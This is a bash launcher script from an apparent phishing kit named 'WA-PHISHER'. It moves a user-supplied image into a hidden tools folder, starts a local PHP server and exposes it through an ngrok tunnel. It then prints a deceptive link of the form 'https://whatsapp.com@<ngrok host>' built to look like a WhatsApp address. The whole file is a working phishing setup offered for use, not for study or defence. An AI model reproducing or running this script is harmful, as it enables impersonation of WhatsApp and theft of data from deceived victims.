#!/bin/bash
# Code : GH05T HUNTER5
# Do not upload this tool to your GitHub without my consent
# Collaborator : GH05T-HUNTER5
if [ -f GH05T-HUNTER5.png ]; then
echo ""
rm GH05T-HUNTER5.png
clear
else
echo ""
echo ""
clear
fi
clear
echo "
 ██╗    ██╗ █████╗       ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗             
 ██║    ██║██╔══██╗      ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
 ██║ █╗ ██║███████║█████╗██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
 ██║███╗██║██╔══██║╚════╝██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
 ╚███╔███╔╝██║  ██║      ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
  ╚══╝╚══╝ ╚═╝  ╚═╝      ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
echo " Authors : GH05T-HUNTER5                                    { Ver : 1.0.1 }"
echo ""
read -p " Enter Image Location : " location
read -p " Enter Image Name : " image
cd $location
mv $image $HOME/WA-PHISHER/.tools/.empty7/
cd $HOME/WA-PHISHER/.tools/.empty7/
mv $image GH05T-HUNTER5.jpg
clear
if [ -f ngrok ]; then
if [[ `pidof php` ]]; then
killall php > /dev/null 2>&1
fi
if [[ `pidof ngrok` ]]; then
killall ngrok > /dev/null 2>&1
fi
clear
echo "
 ██╗    ██╗ █████╗       ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗
 ██║    ██║██╔══██╗      ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
 ██║ █╗ ██║███████║█████╗██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
 ██║███╗██║██╔══██║╚════╝██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
 ╚███╔███╔╝██║  ██║      ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
  ╚══╝╚══╝ ╚═╝  ╚═╝      ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
echo " Authors : GH05T-HUNTER5                                    { Ver : 1.0.1 }"
echo ""
php -S 127.0.0.1:4444 > /dev/null 2>&1 &
sleep 3
./ngrok http 4444 > /dev/null 2>&1 &
sleep 10
ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
ngrok_url1=${ngrok_url#https://}
echo " URL 1 : $ngrok_url"
echo " URL 2 : https://whatsapp.com@$ngrok_url1"
sleep 5400
clear
exit
else
clear
echo " Try again"
sleep 5
clear
cd
exit
fi
clear
exit

